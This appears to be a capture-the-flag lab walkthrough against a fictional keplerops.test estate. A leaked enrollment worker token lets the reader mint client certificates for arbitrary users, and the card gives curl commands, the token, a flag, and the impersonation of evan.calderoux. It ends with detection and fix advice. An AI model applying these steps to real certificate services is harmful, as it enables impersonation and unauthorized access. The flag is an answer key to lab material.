## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Over-privileged, publicly-discoverable enrollment token: a read-only directory endpoint discloses the worker credential that mints client certificates, and the mint endpoint validates only the *shape* of the subject |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET /api/service-directory` → `GET /api/enrollment/StaffArchiveUser` → `POST …/requests` |
| **Prerequisite** | rowan's workstation credential (`rowan.ito:fk_developer_…`) |
| **Flag** | `FLAG{d4fd346be0ffce16}` |

**What you are about to read:** how a "service directory" document that exists to help
integrators ends up shipping the enrollment worker token, and how the enrollment API turns
that into a client certificate for any subject you name. This card is the reconnaissance
step; K19.2 uses the certificate.

## Objective

> Recover the staff certificate relationship and the enrollment record relevant to the
> archive handover.

## Background you need

- A **client certificate** is how this estate decides who a caller is on the archive API
  (mutual TLS). The certificate's subject (`CN`/UPN) is the identity.
- Certificates are issued by a CA. The interesting question is never "is the CA trusted" but
  **"what will the CA sign, and who can ask?"** — the issuance policy.
- `step-ca` / Smallstep (present here at `ca.keplerops.test`) exposes *provisioners*; the
  enrollment service in front of it decides which provisioner a caller may use.

## Walkthrough

### 1. The directory hands you the map (and a credential)

```bash
curl -s -k -u rowan.ito:fk_developer_… \
  https://staff.keplerops.test/api/service-directory | jq
```

```json
{
  "archive_subject": "evan.calderoux@keplerops.test",
  "enrollment": "https://staff.keplerops.test/api/enrollment/StaffArchiveUser",
  "enrollment_worker": "fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9",
  "restricted_note": "NOTE-SUP-2841-7",
  "support_registration": "OIDC-FIELDKEST-SUPPORT"
}
```

Two things to notice, both bad:

1. `archive_subject` tells you *which identity owns the archive you want* — that is the
   target of K19.2.
2. `enrollment_worker` is a bearer token, published by a read-only endpoint, whose name says
   exactly what it does.

### 2. Read the enrollment template

```bash
curl -s -k -u rowan.ito:fk_developer_… \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser | jq
```

```json
{
  "eku": "clientAuth",
  "provisioner": "fieldkest-enrollment",
  "requests_endpoint": "https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests",
  "subject_format": "{subject}",
  "template": "StaffArchiveUser"
}
```

`subject_format: "{subject}"` means the subject is a *format string over request input*.
`eku: clientAuth` means the resulting certificate is valid for exactly the purpose you want.

### 3. Ask it for a certificate

```bash
curl -s -k -X POST \
  -H 'Authorization: Bearer fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9' \
  -H 'Content-Type: application/json' \
  -d '{"upn":"rowan.ito@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests | jq 'keys'
```

```json
["certificate_pem", "eku", "flag", "private_key_pem", "upn"]
```

The response carries the flag for this card, plus a ready-to-use keypair. The only
validation applied to the subject is that it looks like a realm UPN:

```bash
curl -s -k -X POST -H "Authorization: Bearer $WORKER" -H 'Content-Type: application/json' \
  -d '{"upn":"arwc-connector-consumer@19f43d2"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests
# {"error":"invalid_upn"}
```

`422 invalid_upn` for anything without `@keplerops.test`; a `201` with a keypair for anything
inside the realm. That is the whole policy.

### 4. Record what you were given

```bash
# keys come back in the JSON, so write them straight to disk
curl -s -k -X POST -H "Authorization: Bearer $WORKER" -H 'Content-Type: application/json' \
  -d '{"upn":"evan.calderoux@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests \
  | jq -r '.certificate_pem' > evan.crt

curl -s -k -X POST -H "Authorization: Bearer $WORKER" -H 'Content-Type: application/json' \
  -d '{"upn":"evan.calderoux@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests \
  | jq -r '.private_key_pem' > evan.key
```

Careful: **each POST mints a fresh keypair**, so cert and key must come from the same
response. One request, two `jq` extractions:

```bash
curl -s ... -o enr.json
jq -r .certificate_pem enr.json > evan.crt
jq -r .private_key_pem enr.json > evan.key
```

## Why this works

The enrollment flow has three roles — directory (discovery), worker token (authorization to
mint), CA (signing) — and the first two were collapsed into one unauthenticated-read
endpoint plus one long-lived shared secret.

Once you hold the worker token, the CA will sign whatever subject you put in the body,
because the template interpolates `{subject}` and the only check is a shape check on the
UPN. The resulting certificate is *cryptographically valid*. Nothing is forged: the CA
genuinely asserts "this key belongs to `evan.calderoux@keplerops.test`". The lie is one
layer up, in the issuance decision.

## Detection and fix

- **Signal:** one worker token producing certificates for many distinct subjects, or any
  subject that is not the authenticated caller.
- **Fix (in order of value):**
  1. Derive the subject from the authenticated principal. Never accept it from the body.
  2. If an operator must enroll on behalf of others, require an explicit authorization
     record naming (issuer, subject, purpose) and log it.
  3. Remove the worker token from the directory response, shorten its lifetime, and scope it
     to one subject per token.
  4. Treat `eku=clientAuth` certificates as authentication material: short TTLs, revocation,
     and an application-side record of which subjects exist.

## Notes and dead ends

- `step ca certificate <upn> … --token fk_cert_enrollment_…` fails — the token is not a
  step-ca JWS (`compact JWS format must have three parts`). The staff `/requests` endpoint
  is the intended path.
- `cert.keplerops.test` exposes only `/health`; `ca.keplerops.test` answers `/health` but is
  not where enrollment happens.
- The `flag` in the response is the same for every UPN — submitting it once per identity
  burns attempts for no gain.
